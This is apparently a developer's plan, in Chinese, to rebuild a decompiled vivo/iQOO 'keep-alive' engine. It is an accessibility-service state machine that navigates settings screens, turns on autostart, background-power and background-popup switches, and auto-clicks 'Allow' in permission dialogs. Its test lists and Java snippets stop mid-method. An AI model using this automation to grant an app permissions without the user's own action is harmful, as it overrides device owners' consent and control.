# Vivo 厂商引擎 TDD 复刻计划

## Context

Vendor `o/i0.java` (684行) 是 vivo/iQOO 的保活引擎，所有厂商引擎中最复杂的。
Replica `VivoEngine.java` (348行) 当前是简化实现，架构完全不同于 vendor。

**核心问题**: replica 基于 `onWindowMatched` 回调模式，vendor 基于 `phase + 窗口检测` 状态机模式。
需要完全重写为 vendor 的状态机架构。

---

## A. Vendor vs Replica 差异总表

### A.1 架构差异

| 维度 | Vendor o/i0.java | Replica VivoEngine.java | 差距 |
|------|-----------------|------------------------|------|
| 继承 | `extends o.c` (KeepAliveEngine) | `extends AutoEngine` | ✅ 等价 |
| 构造参数 | `super(u0(), "com.android.settings")` | `super(buildWindowMatchers(), PERMISSION_MANAGER)` | ❌ primaryPackage 错误 |
| 超时 | 120 秒 | 100 秒 | ❌ 不一致 |
| 字段数 | 11 个 (10 AtomicBoolean + 1 AtomicReference) | 2 个 AtomicBoolean | ❌ 缺 9 个 |
| ListenWindow | 17 个 | 9 个 | ❌ 缺 8 个 |
| 状态机 | 7 个 phase + 7 个 state | 无状态机 | ❌ 完全缺失 |
| 事件处理 | `u()` phase 分发 | `onWindowMatched()` 回调 | ❌ 架构不同 |
| 窗口检测 | 7 个方法 (j0/k0/l0/m0/n0/o0/p0) | 无 | ❌ 完全缺失 |
| 完成流程 | `z0()` 双应用切换 | 无 | ❌ 完全缺失 |
| 状态持久化 | `y0()` PowerControlStateVO | 无 | ❌ 完全缺失 |

### A.2 方法逐项对比

| Vendor 方法 | 行号 | Replica 方法 | 状态 | 差距描述 |
|-------------|------|-------------|------|----------|
| `u0()` | 197-217 | `buildWindowMatchers()` | ❌ | vendor 17个LW，replica 9个且包名/类名多处错误 |
| `u()` | 484-593 | `onAccessibilityEvent()` | ❌ | vendor 7-phase 状态机，replica 无状态机 |
| `Z()` | 261-295 | `finish()` | ⚠️ | vendor 完整清理(X+P().x+y0+遮罩+策略)，replica 简化 |
| `A0()` | 238-259 | `openBackgroundManager()` | ⚠️ | vendor 启动 PowerRankActivity，replica 启动 BackgroundManager |
| `z0()` | 644-683 | *(缺失)* | ❌ | 双应用切换+完成流程 |
| `y0()` | 595-642 | *(缺失)* | ❌ | PowerControlStateVO 持久化 (含 allowPopupInBackground) |
| `t0()` | 435-482 | *(缺失)* | ❌ | 权限管理页处理 (滚动查找"所有权限") |
| `q0()` | 421-433 | *(缺失)* | ❌ | 手势滚动+坐标点击 |
| `j0()` | 307-323 | *(缺失)* | ❌ | App详情窗口检测 |
| `k0()` | 325-340 | *(缺失)* | ❌ | 权限详情窗口检测 |
| `l0()` | 342-358 | *(缺失)* | ❌ | 权限管理窗口检测 |
| `m0()` | 360-374 | *(缺失)* | ❌ | 耗电详情窗口检测 |
| `n0()` | 376-390 | *(缺失)* | ❌ | 耗电管理窗口检测 |
| `o0()` | 392-406 | *(缺失)* | ❌ | 权限对话框窗口检测 |
| `p0()` | 408-419 | *(缺失)* | ❌ | 电池排行窗口检测 |
| `b0()` | 129-134 | *(缺失)* | ❌ | VIVO_ALLOW_TEXT filter |
| `D0()` | 96-101 | *(缺失)* | ❌ | VIVO_APP_ALL_PERMISSION_TEXT filter |
| `E0()` | 103-108 | *(缺失)* | ❌ | VIVO_BACKGROUND_POWER_MANAGER_TEXT filter |
| `H0()` | 122-127 | *(缺失)* | ❌ | VIVO_APP_PERMISSION_TEXT filter |
| `i0()` | 178-183 | *(缺失)* | ❌ | VIVO_AUTO_START_TEXT filter |
| `w0()` | 225-230 | *(缺失)* | ❌ | VIVO_POPUP_IN_BACKGROUND_TEXT filter |
| `C0()` | 86-94 | *(缺失)* | ❌ | RelativeLayout + id:all_opt filter |
| `equals()` | 298-300 | *(缺失)* | ❌ | instanceof 判等 |
| `hashCode()` | 302-305 | *(缺失)* | ❌ | 类名 hash |

### A.3 字段对比

| Vendor 字段 | 类型 | 初始值 | Replica 字段 | 状态 |
|-------------|------|--------|-------------|------|
| `f649r` | `AtomicReference<r.e>` | KEEP_ALIVE_UNKNOWN | *(缺失)* | ❌ |
| `f650s` | `AtomicReference<String>` | null | *(缺失)* | ❌ |
| `f651t` | `AtomicBoolean` | false | `autoStartDone` | ⚠️ 语义不同 |
| `f652u` | `AtomicBoolean` | false | *(缺失)* | ❌ |
| `f653v` | `AtomicBoolean` | true | *(缺失)* | ❌ |
| `f654w` | `AtomicBoolean` | true | *(缺失)* | ❌ |
| `f655x` | `AtomicBoolean` | false | *(缺失)* | ❌ |
| `f656y` | `AtomicBoolean` | false | *(缺失)* | ❌ |
| `f657z` | `AtomicBoolean` | false | *(缺失)* | ❌ |
| `A` | `AtomicBoolean` | false | *(缺失)* | ❌ |

---

## B. Vendor ListenWindow 完整清单 (u0() 行 197-217)

| # | 构造方法 | packageName | className | matchs | eventTypes | 说明 |
|---|----------|-------------|-----------|--------|------------|------|
| 0 | `c.J()` | com.android.settings | android.app.Dialog | — | 32,16384 | 电池优化对话框 (共享) |
| 1 | `d0(主包名)` | com.android.settings | com.vivo.settings.applications.InstalledAppDetailsTop | H(主包名) | 32,16384 | 应用详情 (主) |
| 2 | `c0(主包名)` | com.android.settings | com.vivo.settings.VivoSubSettings | H(主包名) | 32,16384 | vivo子设置 (主) |
| 3 | `d0(备份包名)` | com.android.settings | com.vivo.settings.applications.InstalledAppDetailsTop | H(备份包名) | 32,16384 | 应用详情 (备份) |
| 4 | `c0(备份包名)` | com.android.settings | com.vivo.settings.VivoSubSettings | H(备份包名) | 32,16384 | vivo子设置 (备份) |
| 5 | `h0()` | com.android.permissioncontroller | ...ManagePermissionsActivity | — | 32,16384 | 权限管理 |
| 6 | `g0()` | com.android.settings | android.widget.FrameLayout | — | 32,16384 | 设置 FrameLayout |
| 7 | `f0()` | com.vivo.permissionmanager | ...SoftPermissionDetailActivity | — | 32,16384 | 权限详情 |
| 8 | `e0(主包名)` | *(null)* | *(null)* | H(主包名) | 32,16384 | 通用匹配 (主) |
| 9 | `e0(备份包名)` | *(null)* | *(null)* | H(备份包名) | 32,16384 | 通用匹配 (备份) |
| 10 | `v0()` | com.vivo.permissionmanager | com.originui.widget.dialog.h | — | 32,16384 | vivo对话框 |
| 11 | `B0()` | com.vivo.permissionmanager | android.app.AlertDialog | — | 32,16384 | 权限对话框 |
| 12 | `x0()` | com.iqoo.powersaving | ...PowerRankActivity | — | 32,16384 | iQOO电池排行 |
| 13 | `G0()` | com.vivo.abe | ...ExcessivePowerManagerActivity | — | 32,16384 | vivo耗电管理 |
| 14 | `s0()` | com.iqoo.powersaving | ...ExcessivePowerManagerActivity | — | 32,16384 | iQOO耗电管理 |
| 15 | `F0()` | com.vivo.abe | ...ExcessivePowerDescriptionActivity | — | 32,16384 | vivo耗电详情 |
| 16 | `r0()` | com.iqoo.powersaving | ...ExcessivePowerDescriptionActivity | — | 32,16384 | iQOO耗电详情 |

**Replica 缺失**: #0(电池优化对话框), #5(权限管理), #6(FrameLayout), #8-9(通用匹配), #10(vivo对话框), #11(权限对话框), #12(iQOO电池排行), #15-16(耗电详情)
**Replica 错误**: primaryPackage 应为 `com.android.settings` 而非 `com.vivo.permissionmanager`; 包名 `com.vivo.settings` 应为 `com.android.settings`

---

## C. Vendor 状态机完整定义

### C.1 Phase 常量 (f650s)

| Phase 值 | 设置位置 | 含义 |
|----------|----------|------|
| `"prepareInAppPowerRank"` | A0():249 | 等待电池排行页 |
| `"prepareInExcessivePowerManager"` | h0(1) 完成后 | 等待耗电管理页 |
| `"prepareInExcessivePowerDescription"` | h0(2) 完成后 | 等待耗电详情页 |
| `"prepareInAppDetailSetting"` | z0():655/663/676 | 等待应用详情页 |
| `"prepareInAppPermissionManage"` | h0(4) 完成后 | 等待权限管理页 |
| `"prepareInAppPermissionDetail"` | h0(5)/t0():470/q0():428 | 等待权限详情页 |
| `"prepareInPermissionAllowDialog"` | h0(6) 完成后 | 等待权限允许对话框 |

### C.2 State 常量 (stateQueue)

| State 值 | 对应 Phase | 任务编号 |
|----------|-----------|---------|
| `"keepAliveInPowerRank"` | prepareInAppPowerRank | h0(1) |
| `"keepAliveInExcessivePowerManager"` | prepareInExcessivePowerManager | h0(2) |
| `"keepAliveInExcessivePowerDescription"` | prepareInExcessivePowerDescription | h0(3) |
| `"keepAliveInAppDetail"` | prepareInAppDetailSetting | h0(4) |
| `"keepAliveInAppPermissionManage"` | prepareInAppPermissionManage | h0(5) |
| `"keepAliveInAppPermissionDetail"` | prepareInAppPermissionDetail | h0(6) |
| `"keepAliveInPermissionAllowDialog"` | prepareInPermissionAllowDialog | h0(7) |

### C.3 事件处理 u() 状态转换矩阵 (行 484-593)

```
u(event, pkg, cls):
  if T() → return                          // 已完成
  if event != null → super.u()             // 电池优化对话框检测

  phase = f650s.get()
  queue = f609n (stateQueue)

  [1] phase=="prepareInAppPowerRank" && p0():
      T0(5) → 清除其他6个state → 入队"keepAliveInPowerRank" → h0(this,1)

  [2] phase=="prepareInExcessivePowerManager" && n0():
      T0(5) → 清除其他6个state → 入队"keepAliveInExcessivePowerManager" → h0(this,2)

  [3] phase=="prepareInExcessivePowerDescription" && m0():
      T0(5) → 清除其他6个state → 入队"keepAliveInExcessivePowerDescription" → h0(this,3)

  [4] phase=="prepareInAppDetailSetting" && j0():
      T0(5) → 清除其他6个state → 入队"keepAliveInAppDetail" → h0(this,4)

  [5] phase=="prepareInAppPermissionManage" && l0():
      T0(5) → 清除其他6个state → 入队"keepAliveInAppPermissionManage" → h0(this,5)

  [6] phase=="prepareInAppPermissionDetail" && k0():
      T0(5) → 清除其他6个state → 入队"keepAliveInAppPermissionDetail" → h0(this,6)

  [7] phase=="prepareInPermissionAllowDialog" && o0():
      T0(5) → 清除其他6个state → 入队"keepAliveInPermissionAllowDialog" → h0(this,7)
```

### C.4 窗口检测方法 (行 307-419)

每个检测方法构建一个 WindowMatcher 列表，调用基类 `q()` (waitForWindowMatch):

| 方法 | 匹配的 ListenWindow | 说明 |
|------|---------------------|------|
| `j0()` | d0(主)+c0(主)+d0(备)+c0(备) | App详情/vivo子设置 |
| `k0()` | f0()+e0(主)+e0(备) | 权限详情+通用匹配 |
| `l0()` | h0()+g0()+e0(主)+e0(备) | 权限管理+FrameLayout+通用 |
| `m0()` | F0()+r0() | 耗电详情 (vivo+iQOO) |
| `n0()` | G0()+s0() | 耗电管理 (vivo+iQOO) |
| `o0()` | v0()+B0() | 权限对话框 (vivo dialog+AlertDialog) |
| `p0()` | x0() | 电池排行 (iQOO) |

### C.5 任务处理 h0(case) 推断

h0 是 Runnable，根据 case 编号执行不同任务:

| case | 入口 | 核心逻辑 | 完成后 phase |
|------|------|----------|-------------|
| 0 | 构造函数 (120s超时) | 超时检查 → Z() | — |
| 1 | keepAliveInPowerRank | 电池排行页: 查找应用→点击→进入耗电管理 | prepareInExcessivePowerManager |
| 2 | keepAliveInExcessivePowerManager | 耗电管理页: 操作后台耗电开关 | prepareInExcessivePowerDescription |
| 3 | keepAliveInExcessivePowerDescription | 耗电详情页: 操作详细设置 | prepareInAppDetailSetting (via z0) |
| 4 | keepAliveInAppDetail | 应用详情页: 查找"应用权限"→点击 | prepareInAppPermissionManage |
| 5 | keepAliveInAppPermissionManage | 权限管理页: 查找"所有权限"→点击 (t0) | prepareInAppPermissionDetail |
| 6 | keepAliveInAppPermissionDetail | 权限详情页: 操作各权限开关 | prepareInPermissionAllowDialog |
| 7 | keepAliveInPermissionAllowDialog | 权限允许对话框: 点击"允许" | 回到 prepareInAppPermissionDetail |

### C.6 完成流程 z0() (行 644-683)

```
z0():
  y0()  // 先保存当前状态

  if keepAliveType == UNKNOWN:
    if 主应用未完成 → set MAIN_APP → phase="prepareInAppDetailSetting" → 启动主应用详情
    elif 备份应用未完成 && 已安装 → set BACKUP_APP → phase="prepareInAppDetailSetting" → 启动备份详情

  elif keepAliveType == MAIN_APP:
    if 备份应用未完成 && 已安装 → set BACKUP_APP → phase="prepareInAppDetailSetting" → 启动备份详情
    else → y0() → Z()  // 全部完成
```

### C.7 CombineFilter 配置 Key

| 方法 | Vendor 行号 | 配置 Key | className | property | 说明 |
|------|------------|----------|-----------|----------|------|
| `b0()` | 129-134 | VIVO_ALLOW_TEXT | Button | text | 允许按钮 |
| `D0()` | 96-101 | VIVO_APP_ALL_PERMISSION_TEXT | TextView | text | 所有权限 |
| `E0()` | 103-108 | VIVO_BACKGROUND_POWER_MANAGER_TEXT | TextView | text | 后台耗电管理 |
| `H0()` | 122-127 | VIVO_APP_PERMISSION_TEXT | TextView | text | 应用权限 |
| `i0()` | 178-183 | VIVO_AUTO_START_TEXT | TextView | text | 自启动 |
| `w0()` | 225-230 | VIVO_POPUP_IN_BACKGROUND_TEXT | TextView | text | 后台弹窗 |
| `C0()` | 86-94 | — | RelativeLayout | id:all_opt | 所有权限容器 |

---

## D. TDD Phase 分解

### Phase 1: 字段+常量+构造函数对齐

**目标**: 补全 11 个字段、修正 primaryPackage、修正超时时间

#### 1.1 RED: 测试

文件: `VivoEngineFieldTest.java` (新建)

```
testFields_keepAliveType_defaultUnknown
  // 反射读取 keepAliveType → assertEquals KA_UNKNOWN

testFields_phase_defaultNull
  // 反射读取 phase → assertNull

testFields_mainAutoStart_defaultFalse
testFields_backupAutoStart_defaultFalse
testFields_mainRelateStart_defaultTrue
testFields_backupRelateStart_defaultTrue
testFields_mainBackground_defaultFalse
testFields_backupBackground_defaultFalse
testFields_mainPopup_defaultFalse
testFields_backupPopup_defaultFalse
  // 10 个 AtomicBoolean 初始值验证

testConstructor_primaryPackage_isSettings
  // 验证 primaryPackage == "com.android.settings"

testConstructor_timeout_is120
  // 验证 scheduler 超时 120 秒
```

#### 1.2 GREEN: 实现

```java
// 修正构造函数
public VivoEngine() {
    super(buildWindowMatchers(), "com.android.settings");  // 修正 primaryPackage
    // ... 初始化 11 个字段
    scheduler.schedule(..., 120L, TimeUnit.SECONDS);  // 修正超时
}

// 补全字段 — 对应 vendor o/i0.java 行 30-58
private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_UNKNOWN);
private final AtomicReference<String> phase = new AtomicReference<>(null);
private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);      // f651t
private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);    // f652u
private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);     // f653v
private final AtomicBoolean backupRelateStart = new AtomicBoolean(true);   // f654w
private final AtomicBoolean mainBackground = new AtomicBoolean(false);     // f655x
private final AtomicBoolean backupBackground = new AtomicBoolean(false);   // f656y
private final AtomicBoolean mainPopup = new AtomicBoolean(false);          // f657z
private final AtomicBoolean backupPopup = new AtomicBoolean(false);        // A
```

测试数: 12

---

### Phase 2: ListenWindow 列表对齐 (u0)

**目标**: 从 9 个扩展到 17 个，修正包名/类名

#### 2.1 RED: 测试

文件: `VivoEngineWindowMatchTest.java` (新建)

```
testWindowMatchers_totalCount_is17
  // assertEquals(17, buildWindowMatchers().size())

testWindowMatchers_batteryDialog_matches
  // com.android.settings / android.app.Dialog

testWindowMatchers_installedAppDetailsTop_main_matches
  // com.android.settings / InstalledAppDetailsTop

testWindowMatchers_vivoSubSettings_main_matches
  // com.android.settings / VivoSubSettings

testWindowMatchers_installedAppDetailsTop_backup_matches
testWindowMatchers_vivoSubSettings_backup_matches

testWindowMatchers_managePermissions_matches
  // com.android.permissioncontroller / ManagePermissionsActivity

testWindowMatchers_frameLayout_matches
  // com.android.settings / android.widget.FrameLayout

testWindowMatchers_softPermissionDetail_matches
  // com.vivo.permissionmanager / SoftPermissionDetailActivity

testWindowMatchers_nullPackage_main_matches
  // null / null + matchs(主包名)

testWindowMatchers_nullPackage_backup_matches
  // null / null + matchs(备份包名)

testWindowMatchers_vivoDialog_matches
  // com.vivo.permissionmanager / com.originui.widget.dialog.h

testWindowMatchers_alertDialog_matches
  // com.vivo.permissionmanager / android.app.AlertDialog

testWindowMatchers_powerRank_matches
  // com.iqoo.powersaving / PowerRankActivity

testWindowMatchers_vivoExcessivePower_matches
  // com.vivo.abe / ExcessivePowerManagerActivity

testWindowMatchers_iqooExcessivePower_matches
  // com.iqoo.powersaving / ExcessivePowerManagerActivity

testWindowMatchers_vivoExcessivePowerDesc_matches
  // com.vivo.abe / ExcessivePowerDescriptionActivity

testWindowMatchers_iqooExcessivePowerDesc_matches
  // com.iqoo.powersaving / ExcessivePowerDescriptionActivity
```

#### 2.2 GREEN: 实现

完全重写 `buildWindowMatchers()` 对齐 vendor `u0()` 行 197-217:

```java
private static List<WindowMatcher> buildWindowMatchers() {
    List<WindowMatcher> list = new ArrayList<>();
    // 0: c.J() — 电池优化对话框
    list.add(new WindowMatcher("com.android.settings", "android.app.Dialog")
        .addEventType(32).addEventType(16384));
    // 1-2: d0/c0(主包名)
    list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
        .addEventType(32).addEventType(16384));
    list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
        .addEventType(32).addEventType(16384));
    // 3-4: d0/c0(备份包名)
    list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
        .addEventType(32).addEventType(16384));
    list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
        .addEventType(32).addEventType(16384));
    // 5: h0() — 权限管理
    list.add(new WindowMatcher(PERMISSION_CONTROLLER, MANAGE_PERMISSIONS_ACTIVITY)
        .addEventType(32).addEventType(16384));
    // 6: g0() — FrameLayout
    list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
        .addEventType(32).addEventType(16384));
    // 7: f0() — 权限详情
    list.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL)
        .addEventType(32).addEventType(16384));
    // 8-9: e0(主/备) — 通用匹配
    list.add(new WindowMatcher(null, null).addEventType(32).addEventType(16384));
    list.add(new WindowMatcher(null, null).addEventType(32).addEventType(16384));
    // 10: v0() — vivo对话框
    list.add(new WindowMatcher(PERMISSION_MANAGER, VIVO_DIALOG)
        .addEventType(32).addEventType(16384));
    // 11: B0() — AlertDialog
    list.add(new WindowMatcher(PERMISSION_MANAGER, "android.app.AlertDialog")
        .addEventType(32).addEventType(16384));
    // 12: x0() — iQOO电池排行
    list.add(new WindowMatcher(IQOO_POWERSAVING, POWER_RANK_ACTIVITY)
        .addEventType(32).addEventType(16384));
    // 13: G0() — vivo耗电管理
    list.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_ACTIVITY)
        .addEventType(32).addEventType(16384));
    // 14: s0() — iQOO耗电管理
    list.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_ACTIVITY)
        .addEventType(32).addEventType(16384));
    // 15: F0() — vivo耗电详情
    list.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_DESC_ACTIVITY)
        .addEventType(32).addEventType(16384));
    // 16: r0() — iQOO耗电详情
    list.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_DESC_ACTIVITY)
        .addEventType(32).addEventType(16384));
    return list;
}
```

测试数: 19

---

### Phase 3: 窗口检测方法 + 状态机事件处理 (j0~p0 + u)

**目标**: 实现 7 个窗口检测方法，重写 `onAccessibilityEvent()` 为 vendor 的 phase 状态机

#### 3.1 RED: 测试

文件: `VivoEngineStateMachineTest.java` (新建)

```
// === 窗口检测方法 ===

testJ0_appDetail_matchesInstalledAppDetailsTop
  // 设置 currentPackage=com.android.settings, currentClassName=InstalledAppDetailsTop
  // assert j0() == true

testJ0_appDetail_matchesVivoSubSettings
  // currentClassName=VivoSubSettings → j0() == true

testJ0_wrongWindow_returnsFalse
  // currentClassName=PowerRankActivity → j0() == false

testK0_permissionDetail_matchesSoftPermissionDetail
  // com.vivo.permissionmanager / SoftPermissionDetailActivity → k0() == true

testK0_permissionDetail_matchesNullPackage
  // null / null (通用匹配) → k0() == true

testL0_permissionManage_matchesManagePermissions
  // com.android.permissioncontroller / ManagePermissionsActivity → l0() == true

testL0_permissionManage_matchesFrameLayout
  // com.android.settings / FrameLayout → l0() == true

testM0_excessivePowerDesc_matchesVivoAbe
  // com.vivo.abe / ExcessivePowerDescriptionActivity → m0() == true

testM0_excessivePowerDesc_matchesIqoo
  // com.iqoo.powersaving / ExcessivePowerDescriptionActivity → m0() == true

testN0_excessivePowerManager_matchesVivoAbe
  // com.vivo.abe / ExcessivePowerManagerActivity → n0() == true

testN0_excessivePowerManager_matchesIqoo
  // com.iqoo.powersaving / ExcessivePowerManagerActivity → n0() == true

testO0_permissionDialog_matchesVivoDialog
  // com.vivo.permissionmanager / com.originui.widget.dialog.h → o0() == true

testO0_permissionDialog_matchesAlertDialog
  // com.vivo.permissionmanager / android.app.AlertDialog → o0() == true

testP0_powerRank_matchesIqoo
  // com.iqoo.powersaving / PowerRankActivity → p0() == true

testP0_powerRank_wrongPackage_returnsFalse
  // com.vivo.abe / PowerRankActivity → p0() == false

// === 事件处理状态机 ===

testOnEvent_prepareInAppPowerRank_p0Match_enqueuesState
  // phase="prepareInAppPowerRank" + p0()匹配
  // assert stateQueue.contains("keepAliveInPowerRank")

testOnEvent_prepareInExcessivePowerManager_n0Match_enqueuesState
  // phase="prepareInExcessivePowerManager" + n0()匹配
  // assert stateQueue.contains("keepAliveInExcessivePowerManager")

testOnEvent_prepareInAppDetailSetting_j0Match_enqueuesState
  // phase="prepareInAppDetailSetting" + j0()匹配
  // assert stateQueue.contains("keepAliveInAppDetail")

testOnEvent_wrongPhase_noMatch_doesNotEnqueue
  // phase="prepareInAppPowerRank" + j0()匹配 (不是 p0)
  // assert stateQueue.isEmpty()

testOnEvent_completed_skips
  // isCompleted=true → 不处理事件

testOnEvent_callsSuperU_forBatteryDialog
  // event != null → 验证调用了 checkBatteryOptimizationDialog

testOnEvent_stateQueueClears_otherStates
  // phase="prepareInAppPowerRank" + p0()匹配
  // 预先放入 "keepAliveInAppDetail"
  // assert "keepAliveInAppDetail" 被移除
```

#### 3.2 GREEN: 实现

```java
// === 窗口检测方法 — 对应 vendor o/i0.java 行 307-419 ===

// 每个方法构建 WindowMatcher 列表，调用 waitForWindowMatch()
// waitForWindowMatch 对应 vendor c.q()

private boolean j0() {  // 行 307-323: App详情
    List<WindowMatcher> list = new ArrayList<>();
    list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS).addEventType(32).addEventType(16384));
    list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS).addEventType(32).addEventType(16384));
    // 主+备份各一份
    return matchesAny(list);
}

private boolean k0() { ... }  // 行 325-340: 权限详情
private boolean l0() { ... }  // 行 342-358: 权限管理
private boolean m0() { ... }  // 行 360-374: 耗电详情
private boolean n0() { ... }  // 行 376-390: 耗电管理
private boolean o0() { ... }  // 行 392-406: 权限对话框
private boolean p0() { ... }  // 行 408-419: 电池排行

// === 事件处理 — 对应 vendor o/i0.java u() 行 484-593 ===

@Override
public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                  String className) {
    try {
        if (T()) return;
        currentPackage = packageName;
        currentClassName = className;

        // vendor u():490-491 — super.u() 电池优化对话框
        if (event != null) {
            checkBatteryOptimizationDialog();
        }

        String currentPhase = phase.get();

        // [1] prepareInAppPowerRank + p0()
        if ("prepareInAppPowerRank".equals(currentPhase) && p0()) {
            T0(5);
            clearOtherStates("keepAliveInPowerRank");
            if (enterState("keepAliveInPowerRank")) {
                scheduler.execute(() -> handlePowerRank());
            }
        }
        // [2] prepareInExcessivePowerManager + n0()
        if ("prepareInExcessivePowerManager".equals(currentPhase) && n0()) {
            T0(5);
            clearOtherStates("keepAliveInExcessivePowerManager");
            if (enterState("keepAliveInExcessivePowerManager")) {
                scheduler.execute(() -> handleExcessivePowerManager());
            }
        }
        // ... [3]-[7] 同理
    } catch (Exception e) {
        logError("事件处理异常", e);
    }
}
```

测试数: 22

---

### Phase 4: 任务处理方法 h0(case 1~4) — 电池+耗电+应用详情

**目标**: 实现 case 1 (电池排行)、case 2 (耗电管理)、case 3 (耗电详情)、case 4 (应用详情)

#### 4.1 RED: 测试

文件: `VivoEngineTaskHandlerTest.java` (新建)

```
// === case 1: handlePowerRank — 电池排行页 ===

testHandlePowerRank_findsApp_clicksEntry
  // mock: scrollView.scrollForwardUntil(H(appName)) → found
  // mock: found.findClickableParent() → clickable → click() → true
  // assert: phase 变为 "prepareInExcessivePowerManager"

testHandlePowerRank_appNotFound_logs
  // mock: scrollView=null, root.findOneByCombine() → null
  // assert: 记录错误日志

// === case 2: handleExcessivePowerManager — 耗电管理页 ===

testHandleExcessivePower_findsBackgroundPowerText_clicks
  // mock: root.findOneByCombine(E0()) → found
  // mock: found.findClickableParent() → click() → true
  // assert: phase 变为 "prepareInExcessivePowerDescription"

testHandleExcessivePower_notFound_fallback
  // mock: E0() 未找到
  // assert: 记录错误

// === case 3: handleExcessivePowerDescription — 耗电详情页 ===

testHandleExcessivePowerDesc_setsBackgroundFlag
  // mock: 操作成功
  // assert: mainBackground.get() == true (当 keepAliveType==MAIN)

testHandleExcessivePowerDesc_callsZ0_completion
  // mock: 操作完成
  // assert: 调用 z0() 完成流程

// === case 4: handleAppDetail — 应用详情页 ===

testHandleAppDetail_findsPermissionText_clicks
  // mock: root.findOneByCombine(H0()) → found → click
  // assert: phase 变为 "prepareInAppPermissionManage"

testHandleAppDetail_notFound_logs
  // mock: H0() 未找到
  // assert: 记录错误
```

#### 4.2 GREEN: 实现

```java
// === case 1: 电池排行 — 对应 vendor h0(this,1) ===
private void handlePowerRank() {
    try {
        if (!p0()) return;
        updateProgress(10);
        activateRoot();  // vendor: G()
        UiNode scrollView = getScrollableNode();  // vendor: Q()
        UiNode target = null;
        if (scrollView != null) {
            target = scrollView.scrollForwardUntil(buildAppNameFilter());
        }
        if (target == null) {
            target = k() != null ? k().findOneByCombine(buildAppNameFilter()) : null;
        }
        if (target != null) {
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                updateProgress(20);
                phase.set("prepareInExcessivePowerManager");
            }
        }
    } catch (Exception e) {
        logError("handlePowerRank", e);
    }
}

// === case 2: 耗电管理 — 对应 vendor h0(this,2) ===
private void handleExcessivePowerManager() { ... }

// === case 3: 耗电详情 — 对应 vendor h0(this,3) ===
private void handleExcessivePowerDescription() { ... }

// === case 4: 应用详情 — 对应 vendor h0(this,4) ===
private void handleAppDetail() { ... }
```

测试数: 8

---

### Phase 5: 任务处理方法 h0(case 5~7) — 权限管理+手势滚动

**目标**: 实现 case 5 (权限管理 t0)、case 6 (权限详情)、case 7 (权限对话框)、手势滚动 q0

#### 5.1 RED: 测试

文件: `VivoEnginePermissionTest.java` (新建)

```
// === case 5: handlePermissionManage (t0) — 权限管理页 ===

testHandlePermissionManage_findsAllPermission_clicks
  // mock: l0()=true, scrollView.scrollForwardUntil(D0()) → found
  // mock: found.findParentUtilCombine(L()) → clickable → click
  // assert: phase 变为 "prepareInAppPermissionDetail"

testHandlePermissionManage_scrollFallback_backward
  // mock: scrollForwardUntil → null, scrollBackwardUntil → found
  // assert: 仍然找到并点击

testHandlePermissionManage_notInWindow_callsQ0
  // mock: l0()=false, phase 仍为 "prepareInAppPermissionManage"
  // assert: 调用 q0() 手势滚动

testHandlePermissionManage_directFind_fallback
  // mock: scrollView=null, k().findOneByCombine(D0()) → found
  // assert: 找到并点击

// === q0() 手势滚动+坐标点击 — vendor 行 421-433 ===

testScrollAndClick_setsPhase
  // mock: MiscUtils.performGesture → true
  // assert: phase 变为 "prepareInAppPermissionDetail"

testScrollAndClick_gestureFailure_noPhaseChange
  // mock: performGesture → false
  // assert: phase 不变

// === case 6: handlePermissionDetail — 权限详情页 ===

testHandlePermissionDetail_findsAutoStartText_operatesSwitch
  // mock: root.findOneByCombine(i0()) → found
  // mock: O(found) → CheckedResult(true, true)
  // assert: mainAutoStart.set(true)

testHandlePermissionDetail_findsPopupText_operatesSwitch
  // mock: root.findOneByCombine(w0()) → found
  // mock: O(found) → CheckedResult(true, true)
  // assert: mainPopup.set(true)

testHandlePermissionDetail_setsPhaseToAllowDialog
  // assert: phase 变为 "prepareInPermissionAllowDialog"

// === case 7: handlePermissionAllowDialog — 权限允许对话框 ===

testHandlePermissionDialog_findsAllowButton_clicks
  // mock: root.findOneByCombine(b0()) → found → click
  // assert: 点击成功

testHandlePermissionDialog_returnsToPermissionDetail
  // assert: phase 变为 "prepareInAppPermissionDetail"
```

#### 5.2 GREEN: 实现

```java
// === case 5: 权限管理 — 对应 vendor t0() 行 435-482 ===
private void handlePermissionManage() {
    try {
        boolean inWindow = l0();
        if (inWindow) {
            updateProgress(80);
            activateRoot();
            UiNode scrollView = getScrollableNode();
            // 重试获取 scrollView — vendor: atomicInteger <= 5
            int retries = 0;
            while (scrollView == null && retries++ < 5) {
                T0(5);
                scrollView = getScrollableNode();
            }
            UiNode target = null;
            if (scrollView != null) {
                target = scrollView.scrollForwardUntil(buildAllPermissionFilter());
                if (target == null) {
                    target = scrollView.scrollBackwardUntil(buildAllPermissionFilter());
                }
            }
            if (target == null) {
                target = k() != null ? k().findOneByCombine(buildAllPermissionFilter()) : null;
            }
            if (target != null) {
                UiNode clickable = target.findClickableParent();
                if (clickable != null && clickable.click()) {
                    updateProgress(85);
                    phase.set("prepareInAppPermissionDetail");
                    return;
                }
            }
        }
        // fallback: 手势滚动
        if ("prepareInAppPermissionManage".equals(phase.get())) {
            scrollAndClick();  // q0()
            updateProgress(85);
        }
    } catch (Exception e) {
        logError("handlePermissionManage", e);
    }
}

// === q0() 手势滚动 — vendor 行 421-433 ===
private void scrollAndClick() {
    try {
        ScreenMetrics metrics = getScreenMetrics();
        int cx = metrics.getWidth() / 2;
        int bottom = metrics.getHeight() - metrics.getNavBarHeight() - 100;
        int top = metrics.getStatusBarHeight();
